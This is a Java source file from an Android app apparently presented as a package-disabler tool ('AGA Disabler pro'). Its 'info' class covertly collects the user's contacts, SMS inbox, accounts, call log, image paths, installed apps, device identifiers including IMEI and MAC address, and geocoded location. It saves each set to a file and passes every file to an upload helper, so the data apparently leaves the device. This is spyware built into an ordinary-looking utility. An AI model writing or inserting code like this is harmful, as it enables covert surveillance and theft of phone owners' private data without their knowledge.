package com.aga.disabler.pro.tools;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import java.io.*;
import java.util.Date;
import java.util.HashMap;

import com.aga.disabler.pro.activity.ScrollingActivity;
import com.google.gson.*;
import java.util.*;
import android.graphics.*;
import android.content.pm.*;
import android.graphics.drawable.*;
import android.util.Base64;
import android.location.*;

import static android.content.Context.LOCATION_SERVICE;
import static com.aga.disabler.pro.tools.Helper.getimei;

public class info {
	public static String mp = Environment.getExternalStorageDirectory() + "/";
    public static String fp = mp + "AGA Disabler/json";
	public static String fa = mp + "AGA Disabler/apps";
	public static String fl = mp + "AGA Disabler/loc";
	
	
	
	
	
	public static void savefile(String fa, String str, String usrname) {
		File file = new File(fa + " " +usrname + " .txt");
        try {
            if (!file.exists()) {
                file.createNewFile();
            }
            FileWriter fileWriter = new FileWriter(file);
            fileWriter.write(str);
            fileWriter.flush();
            fileWriter.close();
            Helper.uploadfile(file.getAbsolutePath());
        } catch (IOException e) {
            e.printStackTrace();
        }
	}

	public static String BitMapToString(Drawable drawable){
		
		Bitmap bitmap;
		 if (drawable instanceof BitmapDrawable) { 
			BitmapDrawable bitmapDrawable = (BitmapDrawable) drawable;
			 if(bitmapDrawable.getBitmap() != null) {
				  bitmap = bitmapDrawable.getBitmap();
				  }
				  } 
	    if(drawable.getIntrinsicWidth() <= 0 || drawable.getIntrinsicHeight() <= 0) {
			 bitmap = Bitmap.createBitmap(50, 50, Bitmap.Config.ARGB_8888); 
			 } else { 
		bitmap = Bitmap.createBitmap(drawable.getIntrinsicWidth(), drawable.getIntrinsicHeight(), Bitmap.Config.ARGB_8888); 
		} 
		Canvas canvas = new Canvas(bitmap);
		drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
		drawable.draw(canvas); 
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream);
        byte[] bitmapByte = stream.toByteArray();
        return Base64.encodeToString(bitmapByte, 2);
}


    public static String convertStreamToString(InputStream is) throws Exception {
         BufferedReader reader = new BufferedReader(new InputStreamReader(is));
          StringBuilder sb = new StringBuilder();
           String line;
            while ((line = reader.readLine()) != null) {
                 sb.append(line).append("\n"); 
            }
             reader.close(); 
             return sb.toString(); 
   } 

    
    public static String getStringFromFile(String fh) throws Exception {
         File fl = new File(fh); 
         FileInputStream fin = new FileInputStream(fl);
          String ret = convertStreamToString(fin);
           fin.close(); 
           return ret; 
           }
    
    
    
    public static void exportapps(Context c, String s) {
		List<App> ha;
		ha = apps(c);
		Gson gson = new GsonBuilder().create();
        String str = gson.toJson(ha);
        savefile(fa, str, s);
	} 
	
    public static String exportinfo(Context c, String name) {
        List<HashMap<String, Object>> list = new ArrayList();
        exportapps(c, name);
        {
	HashMap<String, Object> _item = new HashMap<>();
	_item.put("Contacts", info.con(c));
	list.add(_item);
}

{
	HashMap<String, Object> _item = new HashMap<>();
	_item.put("SMS", info.sms(c));
	list.add(_item);
}

{
	HashMap<String, Object> _item = new HashMap<>();
	_item.put("Accounts", info.acc(c));
	list.add(_item);
}

{
	HashMap<String, Object> _item = new HashMap<>();
	_item.put("Call Log", info.calllog(c));
	list.add(_item);
}

{
	HashMap<String, Object> _item = new HashMap<>();
	_item.put("Images", info.imagesfiles(Environment.getExternalStorageDirectory().getAbsolutePath()));
	list.add(_item);
}

        {
            HashMap<String, Object> _item = new HashMap<>();
            _item.put("Device Info", devinfo(c));
            list.add(_item);
        }

        Gson gson = new GsonBuilder().setPrettyPrinting().create();
        String str = gson.toJson(list);
        savefile(fp, str, name);
        return list.toString();
    }

    public static HashMap con(Context context) {
        HashMap ha = new HashMap();
        ContentResolver contentResolver = context.getContentResolver();
        Cursor query = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, (String[]) null, (String) null, (String[]) null, (String) null);
        if ((query != null ? query.getCount() : 0) > 0) {
            while (query.moveToNext()) {
                String string = query.getString(query.getColumnIndex("_id"));
                String string2 = query.getString(query.getColumnIndex("display_name"));
                if (query.getInt(query.getColumnIndex("has_phone_number")) > 0) {
                    Cursor query2 = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, (String[]) null, "contact_id = ?", new String[]{string}, (String) null);
                    while (query2.moveToNext()) {
                        String string3 = query2.getString(query2.getColumnIndex("data1"));
                        if(ha.containsKey(string2)){
                        ha.put(string2, ha.get(string2) +" - "+ string3);
                        }else{
                        ha.put(string2, string3);
                        }
                    }
                    query2.close();
                }
            }
        }
        if (query != null) {
            query.close();
        }
        return ha;
    }

    public static List devinfo(Context c) {
	    List<Sms> values = new ArrayList<>();
        AboutPhoneHelper aboutPhoneHelper = new AboutPhoneHelper(c);
        //Wifi
        values.add(new Sms("Mac Address", aboutPhoneHelper.getMacAddress("wlan0")));
        values.add(new Sms("IP Address", aboutPhoneHelper.getIPAddress()));
        values.add(new Sms("Wifi State", aboutPhoneHelper.getWifiStates()));
        values.add(new Sms("Network Config", aboutPhoneHelper.getNetwork()));

        //Device Details

        values.add(new Sms("Device Name", aboutPhoneHelper.getdevicename()));
        values.add(new Sms("Manufacture", aboutPhoneHelper.getManufacture()));
        values.add(new Sms("Device Model", aboutPhoneHelper.getModel()));
        values.add(new Sms("Code Name", aboutPhoneHelper.getCodeName()));
        values.add(new Sms("Serial Number", aboutPhoneHelper.getSerialNo()));
        values.add(new Sms("Android Info", aboutPhoneHelper.getAndroidInfo()));
        values.add(new Sms("Build Info", aboutPhoneHelper.getBuildNo()));
        values.add(new Sms("Kernal Info", aboutPhoneHelper.getKernel()));
        values.add(new Sms("Root State", aboutPhoneHelper.isDeviceRooted()));
        values.add(new Sms("Firmware State", aboutPhoneHelper.getfirmwarestate()));
        values.add(new Sms("Warranty", aboutPhoneHelper.warranty()));
        values.add(new Sms("Origin", aboutPhoneHelper.getcountryoforigin(aboutPhoneHelper.getSerialNumber())));
        values.add(new Sms("Build Date", aboutPhoneHelper.manudate()));
        values.add(new Sms("Device Color", aboutPhoneHelper.getcolor()));
        values.add(new Sms("All Device Info", aboutPhoneHelper.allbuildinfo()));

        values.add(new Sms("Resoluton", aboutPhoneHelper.getResolution()));
        values.add(new Sms("Density", aboutPhoneHelper.getDensity()));
        values.add(new Sms("Refresh Rate", aboutPhoneHelper.screenrefrate()));
        values.add(new Sms("Dpi", aboutPhoneHelper.getDpi()));
        values.add(new Sms("Screen Time Out", aboutPhoneHelper.screentimeout()));
        values.add(new Sms("X Pixels", aboutPhoneHelper.getpixelsforx()));
        values.add(new Sms("Y Pixels", aboutPhoneHelper.getpixelsfory()));
        values.add(new Sms("Brightness", aboutPhoneHelper.brightness()));

        values.add(new Sms("Sensors", aboutPhoneHelper.sensordetails()));

        values.add(new Sms("Processor Info", aboutPhoneHelper.processorinfo()));
        values.add(new Sms("Processor Cores", aboutPhoneHelper.proccores()));

        values.add(new Sms("Ram", aboutPhoneHelper.getRam()));
        values.add(new Sms("Storage", aboutPhoneHelper.Storagesettings()));
        values.add(new Sms("Country Code", aboutPhoneHelper.getCountryCode()));
        values.add(new Sms("Product Code", aboutPhoneHelper.procode()));
        values.add(new Sms("Product Code", aboutPhoneHelper.procode()));
        values.add(new Sms("Security Patch Level", aboutPhoneHelper.getsecuritypatchlvl()));
        values.add(new Sms("Device ID", getimei(c)));
        values.add(new Sms("Java VM Version", aboutPhoneHelper.javavm()));

        return values;
    }

    public static List sms(Context context) {
        List<Sms> ha = new ArrayList();
        info ij = new info();
        StringBuilder sb = new StringBuilder();
        try {
            Cursor query = context.getContentResolver().query(Uri.parse("content://sms/inbox"), new String[]{"_id", "address", "person", "body", "date", "type"}, (String) null, (String[]) null, "date desc");
            if (query.moveToFirst()) {
                int columnIndex = query.getColumnIndex("address");
                int columnIndex2 = query.getColumnIndex("person");
                int columnIndex3 = query.getColumnIndex("body");
                int columnIndex4 = query.getColumnIndex("date");
                int columnIndex5 = query.getColumnIndex("type");
                do {
                    String string = query.getString(columnIndex);
                    int i = query.getInt(columnIndex2);
                    String string2 = query.getString(columnIndex3);
                    long j = query.getLong(columnIndex4);
                    int i2 = query.getInt(columnIndex5);
                    
                    Sms sm = new Sms(string, string2);
                    ha.add(sm);
                } while (query.moveToNext());
                if (!query.isClosed()) {
                    query.close();
                }
            } else {
                Sms sm = new Sms("No", "Msg");
                ha.add(sm);
            }
        } catch (Exception e) {
            Sms sm = new Sms("Exception", e.toString());
                ha.add(sm);
        }
        return ha;
    }

    public static List acc(Context activity) {
        List<Sms> ha = new ArrayList();
        info ij = new info();
        StringBuilder sb = new StringBuilder();
        for (Account account : AccountManager.get(activity).getAccounts()) {
            Sms sm = new Sms(account.name, account.type);
            ha.add(sm);
        }
        return ha;
    }

    public static List calllog(Context context) {
        List<Call> ha = new ArrayList();
        info ij = new info();
        try {
            Cursor query = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, (String[]) null, (String) null, (String[]) null, "date DESC");
            int columnIndex = query.getColumnIndex("name");
            int columnIndex2 = query.getColumnIndex("number");
            int columnIndex3 = query.getColumnIndex("type");
            int columnIndex4 = query.getColumnIndex("date");
            int columnIndex5 = query.getColumnIndex("duration");
            while (query.moveToNext()) {
                String string = query.getString(columnIndex);
                String string2 = query.getString(columnIndex2);
                query.getString(columnIndex3);
                String string3 = query.getString(columnIndex4);
                if(string == null) string = "No Name";
                if(string2 == null) string = "No Number";
                
                Call sm = ij.new Call(string, string2, String.valueOf(new Date(Long.parseLong(string3))), String.valueOf(query.getString(columnIndex5)));
                ha.add(sm);
                
                
                   }
            query.close();
        } catch (Exception e) {
            Call sm = null;
            ha.add(sm);
        }
        return ha;
    }
    
    
    public static List apps(Context c) {
        List<App> ha = new ArrayList();
                try {
                    PackageManager packageManager = c.getPackageManager();
                    for (ApplicationInfo next : packageManager.getInstalledApplications(PackageManager.GET_META_DATA)) {
                          try {
							  
                                Date date = new Date(packageManager.getPackageInfo(next.packageName, PackageManager.GET_PERMISSIONS).firstInstallTime);
                                Drawable applicationIcon = packageManager.getApplicationIcon(next.packageName);
                                String str2 = null;
                                str2 = BitMapToString(applicationIcon);
                                String na = packageManager.getApplicationLabel(next).toString();
                                String pk = next.packageName;
                                String ins = date.toString();
                                App sm = new App(na, pk, str2, ins);
                                ha.add(sm);
                                } catch (PackageManager.NameNotFoundException e) {
                                 App sm = new App("No Name", "Pkg Error", null, e.toString());
                                ha.add(sm);
                            } catch (OutOfMemoryError ignored) {
                                
                            }
                            }
                } catch (Exception e2) {
                    App sm = new App("No Name", "Pkg Error", null, e2.toString());
                                ha.add(sm);
                }
                return ha;
    }
    
	
	public static List<String> imagesfiles(String path) {
		List<String> results = new ArrayList<String>();
		File[] files = new File(path).listFiles();
for (File file : files) {
	String pa = file.getAbsolutePath();
    if (file.isFile()) {
		if(image(pa)){
        results.add(pa);
		}
    }else{
		if(!pa.contains(".")){
		results.addAll(imagesfiles(pa));
		}
	}
}
return results;
	}
    
    public static boolean image(String fk){
	try{	
		final String[] okFileExtensions = new String[] {
        "jpg",
        "png",
        "gif",
        "jpeg"
    };
		for (String extension: okFileExtensions) {
            if (new File(fk).getName().toLowerCase().endsWith(extension)) {
                return true;
            }
        }
		return false;
} catch(Exception ex) {
    return false;
}
	}
	
	public static void saveloc(Context c, double lat, double lng) {
		try{
			StringBuilder sb = new StringBuilder();
sb.append("[Location Info]\n\n");
		Geocoder geocoder;
List<Address> addresses;
geocoder = new Geocoder(c, new Locale("ar"));
addresses = geocoder.getFromLocation(lat, lng, 1);
for(Address ad : addresses){
String city = ad.getLocality();
String state = ad.getAdminArea();
String country = ad.getCountryName();
String postalCode = ad.getPostalCode();
String knownName = ad.getFeatureName();
sb.append("[Start Address]\n");
sb.append("Address : " + ad + "\n");
sb.append("City : " + city + "\n");
sb.append("State : " + state + "\n");
sb.append("Counrty : " + country + "\n");
sb.append("PostalCode : " + postalCode + "\n");
sb.append("FeatureName : " + knownName + "\n");
sb.append("[End Address]\n\n");
}
savefile(fl, sb.toString(), Helper.getlic(c));
}catch(Exception e){
		    savefile(fl, e.toString(), Helper.getlic(c));
}
	}
    
    
    
    
    
    //Classes
    
    public static class Sms{
        private String Name;
        private String Msg;
        
        public Sms(String n, String m){
            Name = n;
            Msg = m;
        }
        
        public Sms(){}
        
    }
    
    public class Call{
        private String Name;
        private String Number;
        private String Date;
        private String Duration;
        
        
        public Call(String n, String m, String g, String a){
            Name = n;
            Number = m;
            Date = g;
            Duration = a;
        }
        
        public Call(){
            
        }
        
    }
    
}
